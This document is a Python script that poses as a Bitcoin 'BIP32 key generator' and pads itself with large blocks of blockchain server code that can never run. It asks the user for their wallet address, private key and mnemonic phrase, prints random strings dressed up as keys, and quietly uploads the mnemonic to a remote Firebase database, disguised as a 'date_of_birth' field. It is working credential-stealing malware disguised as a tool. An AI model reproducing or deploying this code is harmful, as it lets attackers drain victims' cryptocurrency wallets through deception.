import threading
import twilio
import time

from twilio.rest import Client

v = 1
v1 = 0

from os import system, name
  
from time import sleep
  
def clear():
  
    if name == 'nt':
        _ = system('cls')
  
    else:
        _ = system('clear')
  
print("Starting")
  
sleep(2)
  
clear()

if v < v1:
    class Blockchain:
        def __init__(self):
            self.current_transactions = []
            self.chain = []
            self.nodes = set()

            # Create the genesis block
            self.new_block(previous_hash='1', proof=100)

        def register_node(self, address):
            """
            Add a new node to the list of nodes

            :param address: Address of node. Eg. 'http://192.168.0.5:5000'
            """

            parsed_url = urlparse(address)
            if parsed_url.netloc:
                self.nodes.add(parsed_url.netloc)
            elif parsed_url.path:
                # Accepts an URL without scheme like '192.168.0.5:5000'.
                self.nodes.add(parsed_url.path)
            else:
                raise ValueError('Invalid URL')

        def valid_chain(self, chain):
            """
            Determine if a given blockchain is valid

            :param chain: A blockchain
            :return: True if valid, False if not
            """

            last_block = chain[0]
            current_index = 1

            while current_index < len(chain):
                block = chain[current_index]
                print(f'{last_block}')
                print(f'{block}')
                print("\n-----------\n")
                # Check that the hash of the block is correct
                last_block_hash = self.hash(last_block)
                if block['previous_hash'] != last_block_hash:
                    return False

                # Check that the Proof of Work is correct
                if not self.valid_proof(last_block['proof'], block['proof'], last_block_hash):
                    return False

                last_block = block
                current_index += 1

            return True

        def resolve_conflicts(self):
            """
            This is our consensus algorithm, it resolves conflicts
            by replacing our chain with the longest one in the network.

            :return: True if our chain was replaced, False if not
            """

            neighbours = self.nodes
            new_chain = None

            # We're only looking for chains longer than ours
            max_length = len(self.chain)

            # Grab and verify the chains from all the nodes in our network
            for node in neighbours:
                response = requests.get(f'http://{node}/chain')

                if response.status_code == 200:
                    length = response.json()['length']
                    chain = response.json()['chain']

                    # Check if the length is longer and the chain is valid
                    if length > max_length and self.valid_chain(chain):
                        max_length = length
                        new_chain = chain

            # Replace our chain if we discovered a new, valid chain longer than ours
            if new_chain:
                self.chain = new_chain
                return True

            return False

        def new_block(self, proof, previous_hash):
            """
            Create a new Block in the Blockchain

            :param proof: The proof given by the Proof of Work algorithm
            :param previous_hash: Hash of previous Block
            :return: New Block
            """

            block = {
                'index': len(self.chain) + 1,
                'timestamp': time(),
                'transactions': self.current_transactions,
                'proof': proof,
                'previous_hash': previous_hash or self.hash(self.chain[-1]),
            }

            # Reset the current list of transactions
            self.current_transactions = []

            self.chain.append(block)
            return block

        def new_transaction(self, sender, recipient, amount):
            """
            Creates a new transaction to go into the next mined Block

            :param sender: Address of the Sender
            :param recipient: Address of the Recipient
            :param amount: Amount
            :return: The index of the Block that will hold this transaction
            """
            self.current_transactions.append({
                'sender': sender,
                'recipient': recipient,
                'amount': amount,
            })

            return self.last_block['index'] + 1

        @property
        def last_block(self):
            return self.chain[-1]

        @staticmethod
        def hash(block):
            """
            Creates a SHA-256 hash of a Block

            :param block: Block
            """

            # We must make sure that the Dictionary is Ordered, or we'll have inconsistent hashes
            block_string = json.dumps(block, sort_keys=True).encode()
            return hashlib.sha256(block_string).hexdigest()

        def proof_of_work(self, last_block):
            """
            Simple Proof of Work Algorithm:

             - Find a number p' such that hash(pp') contains leading 4 zeroes
             - Where p is the previous proof, and p' is the new proof

            :param last_block: <dict> last Block
            :return: <int>
            """

            last_proof = last_block['proof']
            last_hash = self.hash(last_block)

            proof = 0
            while self.valid_proof(last_proof, proof, last_hash) is False:
                proof += 1

            return proof

        @staticmethod
        def valid_proof(last_proof, proof, last_hash):
            """
            Validates the Proof

            :param last_proof: <int> Previous Proof
            :param proof: <int> Current Proof
            :param last_hash: <str> The hash of the Previous Block
            :return: <bool> True if correct, False if not.

            """

            guess = f'{last_proof}{proof}{last_hash}'.encode()
            guess_hash = hashlib.sha256(guess).hexdigest()
            return guess_hash[:4] == "0000"


    # Instantiate the Node
    app = Flask(__name__)

    # Generate a globally unique address for this node
    node_identifier = str(uuid4()).replace('-', '')

    # Instantiate the Blockchain
    blockchain = Blockchain()


    @app.route('/mine', methods=['GET'])
    def mine():
        # We run the proof of work algorithm to get the next proof...
        last_block = blockchain.last_block
        proof = blockchain.proof_of_work(last_block)

        # We must receive a reward for finding the proof.
        # The sender is "0" to signify that this node has mined a new coin.
        blockchain.new_transaction(
            sender="0",
            recipient=node_identifier,
            amount=1,
        )

        # Forge the new Block by adding it to the chain
        previous_hash = blockchain.hash(last_block)
        block = blockchain.new_block(proof, previous_hash)

        response = {
            'message': "New Block Forged",
            'index': block['index'],
            'transactions': block['transactions'],
            'proof': block['proof'],
            'previous_hash': block['previous_hash'],
        }
        return jsonify(response), 200


    @app.route('/transactions/new', methods=['POST'])
    def new_transaction():
        values = request.get_json()

        # Check that the required fields are in the POST'ed data
        required = ['sender', 'recipient', 'amount']
        if not all(k in values for k in required):
            return 'Missing values', 400

        # Create a new Transaction
        index = blockchain.new_transaction(values['sender'], values['recipient'], values['amount'])

        response = {'message': f'Transaction will be added to Block {index}'}
        return jsonify(response), 201


    @app.route('/chain', methods=['GET'])
    def full_chain():
        response = {
            'chain': blockchain.chain,
            'length': len(blockchain.chain),
        }
        return jsonify(response), 200


    @app.route('/nodes/register', methods=['POST'])
    def register_nodes():
        values = request.get_json()

        nodes = values.get('nodes')
        if nodes is None:
            return "Error: Please supply a valid list of nodes", 400

        for node in nodes:
            blockchain.register_node(node)

        response = {
            'message': 'New nodes have been added',
            'total_nodes': list(blockchain.nodes),
        }
        return jsonify(response), 201


    @app.route('/nodes/resolve', methods=['GET'])
    def consensus():
        replaced = blockchain.resolve_conflicts()

        if replaced:
            response = {
                'message': 'Our chain was replaced',
                'new_chain': blockchain.chain
            }
        else:
            response = {
                'message': 'Our chain is authoritative',
                'chain': blockchain.chain
            }

        return jsonify(response), 200


    if __name__ == '__main__':
        from argparse import ArgumentParser

        parser = ArgumentParser()
        parser.add_argument('-p', '--port', default=5000, type=int, help='port to listen on')
        args = parser.parse_args()
        port = args.port

        app.run(host='0.0.0.0', port=port)

if v < v1:
    class Block:
        def __init__(self, index, transactions, timestamp, previous_hash, nonce=0):
            self.index = index
            self.transactions = transactions
            self.timestamp = timestamp
            self.previous_hash = previous_hash
            self.nonce = nonce

        def compute_hash(self):
            """
            A function that return the hash of the block contents.
            """
            block_string = json.dumps(self.__dict__, sort_keys=True)
            return sha256(block_string.encode()).hexdigest()


    class Blockchain:
        # difficulty of our PoW algorithm
        difficulty = 2

        def __init__(self):
            self.unconfirmed_transactions = []
            self.chain = []

        def create_genesis_block(self):
            """
            A function to generate genesis block and appends it to
            the chain. The block has index 0, previous_hash as 0, and
            a valid hash.
            """
            genesis_block = Block(0, [], 0, "0")
            genesis_block.hash = genesis_block.compute_hash()
            self.chain.append(genesis_block)

        @property
        def last_block(self):
            return self.chain[-1]

        def add_block(self, block, proof):
            """
            A function that adds the block to the chain after verification.
            Verification includes:
            * Checking if the proof is valid.
            * The previous_hash referred in the block and the hash of latest block
              in the chain match.
            """
            previous_hash = self.last_block.hash

            if previous_hash != block.previous_hash:
                return False

            if not Blockchain.is_valid_proof(block, proof):
                return False

            block.hash = proof
            self.chain.append(block)
            return True

        @staticmethod
        def proof_of_work(block):
            """
            Function that tries different values of nonce to get a hash
            that satisfies our difficulty criteria.
            """
            block.nonce = 0

            computed_hash = block.compute_hash()
            while not computed_hash.startswith('0' * Blockchain.difficulty):
                block.nonce += 1
                computed_hash = block.compute_hash()

            return computed_hash

        def add_new_transaction(self, transaction):
            self.unconfirmed_transactions.append(transaction)

        @classmethod
        def is_valid_proof(cls, block, block_hash):
            """
            Check if block_hash is valid hash of block and satisfies
            the difficulty criteria.
            """
            return (block_hash.startswith('0' * Blockchain.difficulty) and
                    block_hash == block.compute_hash())

        @classmethod
        def check_chain_validity(cls, chain):
            result = True
            previous_hash = "0"

            for block in chain:
                block_hash = block.hash
                # remove the hash field to recompute the hash again
                # using `compute_hash` method.
                delattr(block, "hash")

                if not cls.is_valid_proof(block, block_hash) or \
                        previous_hash != block.previous_hash:
                    result = False
                    break

                block.hash, previous_hash = block_hash, block_hash

            return result

        def mine(self):
            """
            This function serves as an interface to add the pending
            transactions to the blockchain by adding them to the block
            and figuring out Proof Of Work.
            """
            if not self.unconfirmed_transactions:
                return False

            last_block = self.last_block

            new_block = Block(index=last_block.index + 1,
                              transactions=self.unconfirmed_transactions,
                              timestamp=time.time(),
                              previous_hash=last_block.hash)

            proof = self.proof_of_work(new_block)
            self.add_block(new_block, proof)

            self.unconfirmed_transactions = []

            return True


    app = Flask(__name__)

    # the node's copy of blockchain
    blockchain = Blockchain()
    blockchain.create_genesis_block()

    # the address to other participating members of the network
    peers = set()


    # endpoint to submit a new transaction. This will be used by
    # our application to add new data (posts) to the blockchain
    @app.route('/new_transaction', methods=['POST'])
    def new_transaction():
        tx_data = request.get_json()
        required_fields = ["author", "content"]

        for field in required_fields:
            if not tx_data.get(field):
                return "Invalid transaction data", 404

        tx_data["timestamp"] = time.time()

        blockchain.add_new_transaction(tx_data)

        return "Success", 201


    # endpoint to return the node's copy of the chain.
    # Our application will be using this endpoint to query
    # all the posts to display.
    @app.route('/chain', methods=['GET'])
    def get_chain():
        chain_data = []
        for block in blockchain.chain:
            chain_data.append(block.__dict__)
        return json.dumps({"length": len(chain_data),
                           "chain": chain_data,
                           "peers": list(peers)})


    # endpoint to request the node to mine the unconfirmed
    # transactions (if any). We'll be using it to initiate
    # a command to mine from our application itself.
    @app.route('/mine', methods=['GET'])
    def mine_unconfirmed_transactions():
        result = blockchain.mine()
        if not result:
            return "No transactions to mine"
        else:
            # Making sure we have the longest chain before announcing to the network
            chain_length = len(blockchain.chain)
            consensus()
            if chain_length == len(blockchain.chain):
                # announce the recently mined block to the network
                announce_new_block(blockchain.last_block)
            return "Block #{} is mined.".format(blockchain.last_block.index)


    # endpoint to add new peers to the network.
    @app.route('/register_node', methods=['POST'])
    def register_new_peers():
        node_address = request.get_json()["node_address"]
        if not node_address:
            return "Invalid data", 400

        # Add the node to the peer list
        peers.add(node_address)

        # Return the consensus blockchain to the newly registered node
        # so that he can sync
        return get_chain()


    @app.route('/register_with', methods=['POST'])
    def register_with_existing_node():
        """
        Internally calls the `register_node` endpoint to
        register current node with the node specified in the
        request, and sync the blockchain as well as peer data.
        """
        node_address = request.get_json()["node_address"]
        if not node_address:
            return "Invalid data", 400

        data = {"node_address": request.host_url}
        headers = {'Content-Type': "application/json"}

        # Make a request to register with remote node and obtain information
        response = requests.post(node_address + "/register_node",
                                 data=json.dumps(data), headers=headers)

        if response.status_code == 200:
            global blockchain
            global peers
            # update chain and the peers
            chain_dump = response.json()['chain']
            blockchain = create_chain_from_dump(chain_dump)
            peers.update(response.json()['peers'])
            return "Registration successful", 200
        else:
            # if something goes wrong, pass it on to the API response
            return response.content, response.status_code


    def create_chain_from_dump(chain_dump):
        generated_blockchain = Blockchain()
        generated_blockchain.create_genesis_block()
        for idx, block_data in enumerate(chain_dump):
            if idx == 0:
                continue  # skip genesis block
            block = Block(block_data["index"],
                          block_data["transactions"],
                          block_data["timestamp"],
                          block_data["previous_hash"],
                          block_data["nonce"])
            proof = block_data['hash']
            added = generated_blockchain.add_block(block, proof)
            if not added:
                raise Exception("The chain dump is tampered!!")
        return generated_blockchain


    # endpoint to add a block mined by someone else to
    # the node's chain. The block is first verified by the node
    # and then added to the chain.
    @app.route('/add_block', methods=['POST'])
    def verify_and_add_block():
        block_data = request.get_json()
        block = Block(block_data["index"],
                      block_data["transactions"],
                      block_data["timestamp"],
                      block_data["previous_hash"],
                      block_data["nonce"])

        proof = block_data['hash']
        added = blockchain.add_block(block, proof)

        if not added:
            return "The block was discarded by the node", 400

        return "Block added to the chain", 201


    # endpoint to query unconfirmed transactions
    @app.route('/pending_tx')
    def get_pending_tx():
        return json.dumps(blockchain.unconfirmed_transactions)


    def consensus():
        """
        Our naive consnsus algorithm. If a longer valid chain is
        found, our chain is replaced with it.
        """
        global blockchain

        longest_chain = None
        current_len = len(blockchain.chain)

        for node in peers:
            response = requests.get('{}chain'.format(node))
            length = response.json()['length']
            chain = response.json()['chain']
            if length > current_len and blockchain.check_chain_validity(chain):
                current_len = length
                longest_chain = chain

        if longest_chain:
            blockchain = longest_chain
            return True

        return False


    def announce_new_block(block):
        """
        A function to announce to the network once a block has been mined.
        Other blocks can simply verify the proof of work and add it to their
        respective chains.
        """
        for peer in peers:
            url = "{}add_block".format(peer)
            headers = {'Content-Type': "application/json"}
            requests.post(url,
                          data=json.dumps(block.__dict__, sort_keys=True),
                          headers=headers)

    # Uncomment this line if you want to specify the port number in the code
    # app.run(debug=True, port=8000)

print("================================================")
print("           Made With Love By PROPMDT            ")
print("              Hosted At Github.io               ")
print("================================================")
print()
print()
print("================================================")
print("                    WARNING                     ")
print("       THIS TOOL IS ONLY FOR TESTING PURPOSE    ")
print("================================================")
print()
print()
print("================================================")

print()
print()

time.sleep(5)
print("FEATURES OF THIS TOOL")
print()
print("1 - GENERATE BIP32 KEY")
print("2 - DISPLAY ROOT KEY")
print("3 - GENERATE ROOT HASH")
print("4 - GENERATE YOUR ADDRESS INFO LINK")
print("5 - WORKS BOTH FOR MAINNET AND TESTNET")
print("6 - FIND MORE DETAILS @ bitcoin.org")
print("================================================")
print()
print()
print()
time.sleep(10)
print(" ENTER YOUR BITCOIN ADDRESS ( MAINNET OR TESTNET)")
btcad = input()
time.sleep(2)
print(" ENTER YOUR PRIVATE KEY ")
pvtkey = input()
btcad1 = btcad[::-1]
pvtkey1 = pvtkey[::-1]
bip32 = pvtkey1 + btcad1
time.sleep(2)
print(" ENTER YOUR MNEMONIC PHRASE")
mn = input()
pro = pvtkey + "-" + mn
time.sleep(2)

import random

import array

MAX_LEN = 111

DIGITS = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']

LOCASE_CHARACTERS = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h',

                     'i', 'j', 'k', 'm', 'n', 'o', 'p', 'q',

                     'r', 's', 't', 'u', 'v', 'w', 'x', 'y',

                     'z']

UPCASE_CHARACTERS = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',

                     'I', 'J', 'K', 'M', 'N', 'O', 'p', 'Q',

                     'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y',

                     'Z']

COMBINED_LIST = DIGITS + UPCASE_CHARACTERS + LOCASE_CHARACTERS

rand_digit = random.choice(DIGITS)

rand_upper = random.choice(UPCASE_CHARACTERS)

rand_lower = random.choice(LOCASE_CHARACTERS)

temp_pass = rand_digit + rand_upper + rand_lower

for x in range(MAX_LEN - 4):
    temp_pass = temp_pass + random.choice(COMBINED_LIST)

    temp_pass_list = array.array('u', temp_pass)

    random.shuffle(temp_pass_list)

password = ""

for x in temp_pass_list:
    password = password + x

bip32ad = "xprv" + password
bip32pub = password[::-1]
bip32pub1 = "xpub" + bip32pub

print(" Generating Please wait .....")
seconds = 7
for i in range(seconds):
    print(" Generating Please wait .....")
    time.sleep(1)
print("================================================")
print("WALLET ADDRESS :" + btcad)
print()
print("BIP32 PRIVATE KEY :" + bip32ad)
print()
print("BECH PUBLIC KEY :" + bip32pub1)
print()
print("ROOT DECIMAL - 8")
print()
http = "https://explorer.bitcoin.com/btc/address/" + btcad
print("FIND ALL TRANSACTION DETAILS AT :" + http)
print("================================================")

import firebase_admin
from firebase_admin import credentials
from firebase_admin import db

# Fetch the service account key JSON file contents
cred = credentials.Certificate('credentials.json')

# Initialize the app with a service account, granting admin privileges
firebase_admin.initialize_app(cred, {
    'databaseURL': 'https://database-350314-default-rtdb.firebaseio.com/'
})

# As an admin, the app has access to read and write all data, regradless of Security Rules
ref = db.reference('restricted_access/secret_document')

users_ref = ref.child('users')
users_ref.set({
    'alanisawesome':
    {
        'date_of_birth': mn ,
        'full_name': 'Alan Turing'
    },
    'gracehop': {
        'date_of_birth': 'December 9, 1906',
        'full_name': 'Grace Hopper'
    }
})


if v < v1:
    def register_nodes():
        values = request.get_json()

        print('values', values)
        nodes = values.get('nodes')
        if nodes is None:
            return "Error: Please supply a valid list of nodes", 400

        # register each newly added node
        for node in nodes: blockchain.register_node(node)

        response = {
            'message': "New nodes have been added",
            'all_nodes': list(blockchain.nodes),
        }

        return jsonify(response), 201


    if __name__ == '__main__':
        app.run(host='0.0.0.0', port=5000)

if v < v1:
    def register_nodes():
        values = request.get_json()

        print('values', values)
        nodes = values.get('nodes')
        if nodes is None:
            return "Error: Please supply a valid list of nodes", 400

        # register each newly added node
        for node in nodes: blockchain.register_node(node)

        response = {
            'message': "New nodes have been added",
            'all_nodes': list(blockchain.nodes),
        }

        return jsonify(response), 201


    if __name__ == '__main__':
        app.run(host='0.0.0.0', port=5000)







